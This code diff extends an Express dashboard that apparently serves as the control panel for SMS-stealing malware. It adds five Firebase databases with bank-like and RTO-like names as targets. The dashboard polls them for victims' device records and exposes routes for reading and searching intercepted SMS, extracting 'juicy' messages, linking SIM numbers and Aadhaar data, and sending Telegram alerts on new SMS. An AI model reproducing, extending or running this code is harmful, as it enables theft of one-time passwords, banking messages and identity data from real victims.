@@ -256,7 +256,21 @@ const PP_TARGETS = PP_RAW_TARGETS.map(([id, url, schema]) => ({
   id, url: url.replace(/\/$/, ''), schema, isOld: false, isPP: true
 }));
 
-const ALL_TARGETS = [...TARGETS, ...OLD_TARGETS, ...PP_TARGETS];
+// ── SRK RAW_TARGETS ───────────────────────────────────────────────────────────
+// All use schema 1 (All_Users.json endpoint)
+const SRK_RAW_TARGETS = [
+  [201, 'https://hdfc6-8c8b6-default-rtdb.firebaseio.com'],
+  [202, 'https://access3-3d2d5-default-rtdb.firebaseio.com'],
+  [203, 'https://access2-8df64-default-rtdb.firebaseio.com'],
+  [204, 'https://rto7-2d912-default-rtdb.firebaseio.com'],
+  [205, 'https://access1-b1402-default-rtdb.firebaseio.com'],
+];
+
+const SRK_TARGETS = SRK_RAW_TARGETS.map(([id, url]) => ({
+  id, url: url.replace(/\/$/, ''), schema: 1, isOld: false, isPP: false, isSRK: true
+}));
+
+const ALL_TARGETS = [...TARGETS, ...OLD_TARGETS, ...PP_TARGETS, ...SRK_TARGETS];
 
 // ── Dashboard DB: load / save ─────────────────────────────────────────────────
 // Structure: { new: { [targetId]: { [deviceId]: deviceRecord } },
@@ -274,6 +288,7 @@ function loadDashboardDb() {
   if (!dashboardDb.new) dashboardDb.new = {};
   if (!dashboardDb.old) dashboardDb.old = {};
   if (!dashboardDb.pp)  dashboardDb.pp  = {};
+  if (!dashboardDb.srk) dashboardDb.srk = {};
 }
 
 function saveDashboardDb() {
@@ -285,7 +300,7 @@ function saveDashboardDb() {
 }
 
 function getTargetDb(target) {
-  const section = target.isPP ? 'pp' : (target.isOld ? 'old' : 'new');
+  const section = target.isSRK ? 'srk' : (target.isPP ? 'pp' : (target.isOld ? 'old' : 'new'));
   const key = String(target.id);
   if (!dashboardDb[section][key]) dashboardDb[section][key] = {};
   return dashboardDb[section][key];
@@ -932,7 +947,7 @@ function summariseTarget(target) {
 }
 
 function buildDeviceList(target, devices, simOverrides, aadharDb) {
-  const simKey = target.isPP ? `pp_${target.id}` : (target.isOld ? `old_${target.id}` : `new_${target.id}`);
+  const simKey = target.isSRK ? `srk_${target.id}` : (target.isPP ? `pp_${target.id}` : (target.isOld ? `old_${target.id}` : `new_${target.id}`));
   const simForUrl   = simOverrides[simKey] || simOverrides[String(target.id)] || {};
   const aadharForUrl = aadharDb[String(target.id)] || {};
 
@@ -1021,6 +1036,38 @@ app.get('/api/pp/url/:id', (req, res) => {
   res.json({ id, url: target.url, schema: target.schema, devices: deviceList });
 });
 
+// ── SRK URLs API routes ───────────────────────────────────────────────────────
+app.get('/api/srk/urls', (req, res) => {
+  const summaries = SRK_TARGETS.map(t => summariseTarget(t));
+  res.json(summaries);
+});
+
+app.get('/api/srk/url/:id', (req, res) => {
+  const id = parseInt(req.params.id);
+  const target = SRK_TARGETS.find(t => t.id === id);
+  if (!target) return res.status(404).json({ error: 'Not found' });
+  const devices      = getTargetDb(target);
+  const simOverrides = loadSimOverrides();
+  const aadharDb     = loadAadharDb();
+  const deviceList   = buildDeviceList(target, devices, simOverrides, aadharDb);
+  res.json({ id, url: target.url, schema: target.schema, devices: deviceList });
+});
+
+app.post('/api/srk/sim-overrides/:urlId/:deviceId', express.json(), (req, res) => {
+  const { urlId, deviceId } = req.params;
+  const { sim1, sim2 } = req.body;
+  const overrides = loadSimOverrides();
+  const key = `srk_${urlId}`;
+  if (!overrides[key]) overrides[key] = {};
+  if (!overrides[key][deviceId]) overrides[key][deviceId] = {};
+  if (sim1 !== undefined) overrides[key][deviceId].sim1 = sim1;
+  if (sim2 !== undefined) overrides[key][deviceId].sim2 = sim2;
+  if (!overrides[key][deviceId].sim1 && !overrides[key][deviceId].sim2)
+    delete overrides[key][deviceId];
+  saveSimOverrides(overrides);
+  res.json({ ok: true });
+});
+
 app.post('/api/pp/sim-overrides/:urlId/:deviceId', express.json(), (req, res) => {
   const { urlId, deviceId } = req.params;
   const { sim1, sim2 } = req.body;
@@ -1039,7 +1086,7 @@ app.post('/api/pp/sim-overrides/:urlId/:deviceId', express.json(), (req, res) =>
 // ── Force-refresh a single target immediately ─────────────────────────────────
 app.post('/api/url/:id/refresh', async (req, res) => {
   const id = parseInt(req.params.id);
-  const target = TARGETS.find(t => t.id === id) || OLD_TARGETS.find(t => t.id === id) || PP_TARGETS.find(t => t.id === id);
+  const target = TARGETS.find(t => t.id === id) || OLD_TARGETS.find(t => t.id === id) || PP_TARGETS.find(t => t.id === id) || SRK_TARGETS.find(t => t.id === id);
   if (!target) return res.status(404).json({ error: 'Not found' });
   await pollTarget(target);
   res.json({ ok: true, devices: Object.keys(getTargetDb(target)).length });
@@ -1050,7 +1097,8 @@ app.get('/api/url/:id/live', async (req, res) => {
   const id = parseInt(req.params.id);
   const target = TARGETS.find(t => t.id === id)
     || OLD_TARGETS.find(t => t.id === id)
-    || PP_TARGETS.find(t => t.id === id);
+    || PP_TARGETS.find(t => t.id === id)
+    || SRK_TARGETS.find(t => t.id === id);
   if (!target) return res.status(404).json({ error: 'Not found' });
   await pollTarget(target);
   const db = getTargetDb(target);
@@ -1067,7 +1115,7 @@ app.get('/api/url/:id/live', async (req, res) => {
 app.get('/api/url/:id/device/:deviceId/sms', async (req, res) => {
   const id = parseInt(req.params.id);
   const deviceId = req.params.deviceId;
-  const target = [...TARGETS, ...PP_TARGETS].find(t => t.id === id);
+  const target = [...TARGETS, ...OLD_TARGETS, ...PP_TARGETS, ...SRK_TARGETS].find(t => t.id === id);
   if (!target || target.schema !== 17) return res.status(404).json({ error: 'Not schema 17' });
 
   try {
@@ -1095,8 +1143,8 @@ app.get('/api/url/:id/device/:deviceId/searchno', async (req, res) => {
   const id = parseInt(req.params.id);
   const deviceId = req.params.deviceId;
   const mode = req.query.mode || 'new';
-  const pool = mode === 'old' ? OLD_TARGETS : mode === 'pp' ? PP_TARGETS : TARGETS;
-  const target = pool.find(t => t.id === id) || [...TARGETS, ...OLD_TARGETS, ...PP_TARGETS].find(t => t.id === id);
+  const pool = mode === 'old' ? OLD_TARGETS : mode === 'pp' ? PP_TARGETS : mode === 'srk' ? SRK_TARGETS : TARGETS;
+  const target = pool.find(t => t.id === id) || [...TARGETS, ...OLD_TARGETS, ...PP_TARGETS, ...SRK_TARGETS].find(t => t.id === id);
   if (!target) return res.status(404).json({ error: 'URL not found' });
   const db = getTargetDb(target);
   const dev = db[deviceId];
@@ -1127,8 +1175,8 @@ app.get('/api/url/:id/device/:deviceId/searchaadhar', async (req, res) => {
   const id = parseInt(req.params.id);
   const deviceId = req.params.deviceId;
   const mode = req.query.mode || 'new';
-  const pool = mode === 'old' ? OLD_TARGETS : mode === 'pp' ? PP_TARGETS : TARGETS;
-  const target = pool.find(t => t.id === id) || [...TARGETS, ...OLD_TARGETS, ...PP_TARGETS].find(t => t.id === id);
+  const pool = mode === 'old' ? OLD_TARGETS : mode === 'pp' ? PP_TARGETS : mode === 'srk' ? SRK_TARGETS : TARGETS;
+  const target = pool.find(t => t.id === id) || [...TARGETS, ...OLD_TARGETS, ...PP_TARGETS, ...SRK_TARGETS].find(t => t.id === id);
   if (!target) return res.status(404).json({ error: 'URL not found' });
   const db = getTargetDb(target);
   const dev = db[deviceId];
@@ -1159,8 +1207,8 @@ app.get('/api/url/:id/sms-search', async (req, res) => {
   const q  = (req.query.q || '').trim().toLowerCase();
   if (!q) return res.json({ hits: [], total: 0, error: 'No query' });
   const mode = req.query.mode || 'new';
-  const pool = mode === 'old' ? OLD_TARGETS : mode === 'pp' ? PP_TARGETS : TARGETS;
-  const target = pool.find(t => t.id === id) || [...TARGETS, ...OLD_TARGETS, ...PP_TARGETS].find(t => t.id === id);
+  const pool = mode === 'old' ? OLD_TARGETS : mode === 'pp' ? PP_TARGETS : mode === 'srk' ? SRK_TARGETS : TARGETS;
+  const target = pool.find(t => t.id === id) || [...TARGETS, ...OLD_TARGETS, ...PP_TARGETS, ...SRK_TARGETS].find(t => t.id === id);
   if (!target) return res.status(404).json({ error: 'URL not found' });
 
   const db = getTargetDb(target);
@@ -1197,7 +1245,7 @@ app.get('/api/search/device/:deviceId', (req, res) => {
     const db = getTargetDb(target);
     for (const [deviceId, dev] of Object.entries(db)) {
       if (deviceId.toLowerCase().includes(q)) {
-        const urlSet = target.isPP ? 'pp' : (target.isOld ? 'old' : 'new');
+        const urlSet = target.isSRK ? 'srk' : (target.isPP ? 'pp' : (target.isOld ? 'old' : 'new'));
         results.push({
           urlId: target.id, url: target.url, schema: target.schema,
           urlSet, deviceId,
@@ -1223,13 +1271,13 @@ app.get('/api/alert-devices', (req, res) => {
     for (const [deviceId, cfg] of Object.entries(devices)) {
       // Find the target for context
       const target = ALL_TARGETS.find(t => {
-        const ts = t.isPP ? 'pp' : (t.isOld ? 'old' : 'new');
+        const ts = t.isSRK ? 'srk' : (t.isPP ? 'pp' : (t.isOld ? 'old' : 'new'));
         return ts === urlSet;
       });
       // Get device record from DB
       let devRecord = null;
       for (const t of ALL_TARGETS) {
-        const ts = t.isPP ? 'pp' : (t.isOld ? 'old' : 'new');
+        const ts = t.isSRK ? 'srk' : (t.isPP ? 'pp' : (t.isOld ? 'old' : 'new'));
         if (ts !== urlSet) continue;
         const db = getTargetDb(t);
         if (db[deviceId]) { devRecord = db[deviceId]; break; }
@@ -1379,7 +1427,7 @@ app.post('/api/old/sim-overrides/:urlId/:deviceId', express.json(), (req, res) =
 
 // ── Device Notes ──────────────────────────────────────────────────────────────
 function notesKey(urlId, deviceId, mode) {
-  const prefix = mode === 'new' ? 'new' : (mode === 'old' ? 'old' : (mode === 'pp' ? 'pp' : 'new'));
+  const prefix = mode === 'old' ? 'old' : mode === 'pp' ? 'pp' : mode === 'srk' ? 'srk' : 'new';
   return `${prefix}_${urlId}:${deviceId}`;
 }
 
@@ -1474,7 +1522,7 @@ app.post('/api/keywords', express.json(), (req, res) => {
 // ── Telegram Alert Store ──────────────────────────────────────────────────────
 const ALERTS_FILE = path.join(DATA_DIR, 'telegram_alerts.json');
 
-const VALID_URL_SETS = new Set(['new', 'old', 'pp']);
+const VALID_URL_SETS = new Set(['new', 'old', 'pp', 'srk']);
 const VALID_TRIGGERS  = new Set(['device_online', 'device_offline', 'new_sms']);
 const MAX_BOT_NAME   = 100;
 const MAX_BOT_TOKEN  = 200;
@@ -1511,6 +1559,7 @@ function saveAlertStore() {
 }
 
 function targetUrlSet(target) {
+  if (target.isSRK) return 'srk';
   if (target.isPP)  return 'pp';
   if (target.isOld) return 'old';
   return 'new';
@@ -1719,7 +1768,7 @@ app.delete('/api/telegram/bots/:id', (req, res) => {
 
 function validateUrlSet(req, res, next) {
   if (!VALID_URL_SETS.has(req.params.urlSet)) {
-    return res.status(400).json({ error: `Invalid urlSet "${req.params.urlSet}". Must be one of: new, old, pp` });
+    return res.status(400).json({ error: `Invalid urlSet "${req.params.urlSet}". Must be one of: new, old, pp, srk` });
   }
   next();
 }
@@ -1764,8 +1813,8 @@ app.get('/api/url/:id/device/:deviceId/juicy-sms', async (req, res) => {
   const id = parseInt(req.params.id);
   const deviceId = req.params.deviceId;
   const mode = req.query.mode || 'new';
-  const pool = mode === 'old' ? OLD_TARGETS : mode === 'pp' ? PP_TARGETS : TARGETS;
-  const target = pool.find(t => t.id === id) || [...TARGETS, ...OLD_TARGETS, ...PP_TARGETS].find(t => t.id === id);
+  const pool = mode === 'old' ? OLD_TARGETS : mode === 'pp' ? PP_TARGETS : mode === 'srk' ? SRK_TARGETS : TARGETS;
+  const target = pool.find(t => t.id === id) || [...TARGETS, ...OLD_TARGETS, ...PP_TARGETS, ...SRK_TARGETS].find(t => t.id === id);
   if (!target) return res.status(404).json({ error: 'URL not found' });
   const db = getTargetDb(target);
   const dev = db[deviceId];
